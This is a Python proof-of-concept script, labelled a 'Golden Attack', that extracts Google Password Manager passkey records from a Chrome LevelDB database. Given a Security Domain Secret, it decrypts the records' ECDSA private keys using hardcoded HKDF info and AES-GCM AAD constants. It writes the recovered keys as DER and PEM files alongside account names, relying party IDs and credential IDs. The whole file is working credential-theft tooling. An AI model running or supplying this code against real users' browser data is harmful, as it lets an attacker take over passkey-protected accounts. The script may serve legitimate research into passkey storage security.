#!/usr/bin/env python3
"""
Pass-ta-key Golden Attack PoC - Extract and decrypt Google Password Manager
passkeys (WebauthnCredentialSpecifics records and ECDSA P-256 private keys)
from the Chrome LevelDB database.

Copyright (c) 2026 0rcruxe
SPDX-License-Identifier: MIT
See LICENSE for details.
"""

import argparse
import base64
import json
import re
import subprocess
import sys
from pathlib import Path

import webauthn_credential_specifics_pb2

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    PrivateFormat,
    load_der_private_key,
)


HKDF_INFO = b"KeychainApplicationKey:gmscore_module:com.google.android.gms.fido"
AES_AAD   = b"WebauthnCredentialSpecifics.Encrypted"


# Decode \xHH escape sequences emitted by dfleveldb back into raw bytes
def unescape(s: str) -> bytes:
    def replace_hex(m):
        return chr(int(m.group(1), 16))
    s = re.sub(r'\\x([0-9A-Fa-f]{2})', replace_hex, s)
    return s.encode('latin-1')


# Iterate over concatenated JSON objects written by dfleveldb
def load_json_stream(path: Path):
    content = path.read_text(encoding='utf-8')
    decoder = json.JSONDecoder()
    idx, n = 0, len(content)
    while idx < n:
        while idx < n and content[idx] in ' \t\r\n':
            idx += 1
        if idx >= n:
            break
        obj, end = decoder.raw_decode(content, idx)
        yield obj
        idx = end


# Run dfleveldb on a LevelDB directory
def run_dfleveldb(leveldb_dir: Path) -> str:
    print(f"[*] Running dfleveldb in {leveldb_dir}...")
    try:
        result = subprocess.run(
            ['dfleveldb', 'db', '-s', '.'],
            cwd=str(leveldb_dir),
            capture_output=True,
            text=True,
            check=True,
        )
    except FileNotFoundError:
        sys.exit("[-] dfleveldb not found. Install it with: pip install 'dfindexeddb[plugins]'")
    except subprocess.CalledProcessError as e:
        sys.exit(f"[-] dfleveldb failed: {e.stderr}")
    return result.stdout


# Extract and parse WebauthnCredentialSpecifics GPM records from LevelDB
def cmd_extract(args):
    output_dir = Path(args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    json_content = run_dfleveldb(Path(args.leveldb_dir))

    if not json_content.strip():
        sys.exit("[-] dfleveldb returned empty output.")

    json_path = output_dir / 'output.json'
    json_path.write_text(json_content, encoding='utf-8')

    print(f"[*] Parsing {json_path.name}...")

    seen = set()
    count = 0

    for rec in load_json_stream(json_path):
        r = rec.get('record', {})
        key = r.get('key', '')
        # Only webauthn_credential-dt-* keys hold an encrypted private key
        if 'webauthn_credential-dt-' not in key:
            continue
        val = r.get('value', '')
        if not val:
            continue

        raw = unescape(val)
        cred = webauthn_credential_specifics_pb2.WebauthnCredentialSpecifics()
        try:
            cred.ParseFromString(raw)
        except Exception as e:
            print(f"[-] Parse error for {key!r}: {e}")
            continue

        cid = cred.credential_id.hex()
        if cid in seen:
            continue
        seen.add(cid)
        count += 1

        print("=" * 60)
        print(f"LevelDB key : {key!r}")
        print(f"RP ID       : {cred.rp_id}")
        print(f"User name   : {cred.user_name}")
        print(f"Display name: {cred.user_display_name}")
        print(f"Credential ID : {cid}")

        if cred.user_id:
            uid_hex = cred.user_id.hex()
            print(f"User ID     : {uid_hex}")
        else:
            uid_hex = ""
            print("User ID     : (empty)")

        which = cred.WhichOneof('encrypted_data')
        print(f"Encrypted field present : {which}")

        if which == 'encrypted':
            blob = cred.encrypted
        elif which == 'private_key':
            blob = cred.private_key
        elif which == 'security_domain_encrypted':
            blob = cred.security_domain_encrypted
        else:
            print("No encrypted field found.")
            continue

        print(f"Blob size : {len(blob)} bytes")

        blob_file = output_dir / f"enc_{cid}.bin"
        blob_file.write_bytes(blob)
        print(f"-> Blob saved to {blob_file.name}")

        meta = {
            "credential_id_hex":    cid,
            "credential_id_b64url": base64.urlsafe_b64encode(cred.credential_id).rstrip(b'=').decode(),
            "rp_id":                cred.rp_id,
            "user_name":            cred.user_name,
            "user_display_name":    cred.user_display_name,
            "user_id_hex":          uid_hex,
            "user_id_b64url":       base64.urlsafe_b64encode(cred.user_id).rstrip(b'=').decode() if cred.user_id else "",
        }
        meta_file = output_dir / f"meta_{cid}.json"
        meta_file.write_text(json.dumps(meta, indent=2), encoding='utf-8')
        print(f"-> Metadata saved to {meta_file.name}")
        print()

    print(f"[+] Extracted {count} unique passkey record(s).")


# Decrypt a WebAuthn GPM private key blob using the SDS
def cmd_decrypt(args):
    output_dir = Path(args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    sds = bytes.fromhex(args.sds)
    if len(sds) != 32:
        sys.exit(f"[-] SDS must be 32 bytes (got {len(sds)}).")

    blob_path = Path(args.blob)
    blob = blob_path.read_bytes()

    if len(blob) < 12 + 16:
        sys.exit("[-] Blob too short to contain nonce and tag.")

    print(f"[*] Input blob  : {blob_path.name}")
    print(f"    Size        : {len(blob)} bytes")
    print(f"    Nonce       : {blob[:12].hex()}")
    print(f"    Ciphertext  : {blob[12:].hex()}")
    print()

    # Derive the AES-256 key from the SDS using HKDF-SHA256
    aes_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'',
        info=HKDF_INFO,
    ).derive(sds)

    print(f"[+] SDS          : {sds.hex()}")
    print(f"[+] HKDF info    : {HKDF_INFO.decode()}")
    print(f"[+] AES-256 key  : {aes_key.hex()}")
    print()

    nonce = blob[:12]
    ciphertext = blob[12:]

    # AES-256-GCM decryption with the dedicated AAD
    try:
        plaintext = AESGCM(aes_key).decrypt(nonce, ciphertext, AES_AAD)
    except Exception as e:
        sys.exit(f"[-] AES-GCM decryption failed: {e}")

    print(f"[+] Decryption OK ({len(plaintext)} bytes)")
    print(f"    Plaintext (hex): {plaintext.hex()}")
    print()

    # Parse the decrypted Protobuf message to extract the private key
    enc = webauthn_credential_specifics_pb2.WebauthnCredentialSpecifics.Encrypted()
    try:
        enc.ParseFromString(plaintext)
    except Exception as e:
        sys.exit(f"[-] Failed to parse Encrypted message: {e}")

    if not enc.HasField('private_key'):
        sys.exit("[-] No private_key field in decrypted message.")

    pkcs8 = enc.private_key
    print(f"[+] private_key (PKCS#8): {len(pkcs8)} bytes")

    stem = blob_path.stem
    der_path = output_dir / f"{stem}_private_key.der"
    der_path.write_bytes(pkcs8)
    print(f"-> DER saved to {der_path.name}")

    # Convert the PKCS#8 key to PEM
    try:
        key = load_der_private_key(pkcs8, password=None)
        pem = key.private_bytes(
            encoding=Encoding.PEM,
            format=PrivateFormat.PKCS8,
            encryption_algorithm=NoEncryption(),
        )
        pem_path = output_dir / f"{stem}_private_key.pem"
        pem_path.write_bytes(pem)
        print(f"-> PEM saved to {pem_path.name}")
    except Exception as e:
        print(f"[-] PEM conversion failed: {e}")

    if enc.HasField('hmac_secret'):
        print(f"[i] hmac_secret: {enc.hmac_secret.hex()}")
    if enc.HasField('cred_blob'):
        print(f"[i] cred_blob  : {enc.cred_blob.hex()}")
    if enc.HasField('large_blob'):
        print(f"[i] large_blob : {len(enc.large_blob)} bytes")


def build_parser():
    parser = argparse.ArgumentParser(
        prog='passkey_extractor',
        usage='passkey_extractor.py [-h] <command> [options]',
        description='Extract and decrypt Google Password Manager passkeys from a LevelDB database.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
        epilog="""
commands:

  extract   Extract WebauthnCredentialSpecifics records from a LevelDB directory.
              --leveldb-dir DIR   Path to the LevelDB directory.
              --output-dir DIR    Directory where blobs and metadata are written.

  decrypt   Decrypt a WebAuthn private key (ECDSA P-256) GPM passkey blob using the SDS.
              --blob FILE         Path to the encrypted blob (enc_<id>.bin).
              --sds HEX           32-byte Security Domain Secret (SDS), 64 hex chars.
              --output-dir DIR    Directory where the recovered private key is written.

examples:

  python passkey_extractor.py extract --leveldb-dir ./LevelDB --output-dir ./out
  python passkey_extractor.py decrypt --blob ./out/enc_xxxx.bin --sds <64_hex> --output-dir ./out
""",
    )
    parser.add_argument('-h', '--help', action='help', help=argparse.SUPPRESS)
    parser.add_argument('command', choices=['extract', 'decrypt'], help=argparse.SUPPRESS)
    parser.add_argument('--leveldb-dir', help=argparse.SUPPRESS)
    parser.add_argument('--output-dir', default='.', help=argparse.SUPPRESS)
    parser.add_argument('--blob', help=argparse.SUPPRESS)
    parser.add_argument('--sds', help=argparse.SUPPRESS)
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.command == 'extract':
        if not args.leveldb_dir:
            parser.error("extract requires --leveldb-dir")
        cmd_extract(args)

    elif args.command == 'decrypt':
        if not args.blob:
            parser.error("decrypt requires --blob")
        if not args.sds:
            parser.error("decrypt requires --sds")
        cmd_decrypt(args)


if __name__ == '__main__':
    main()
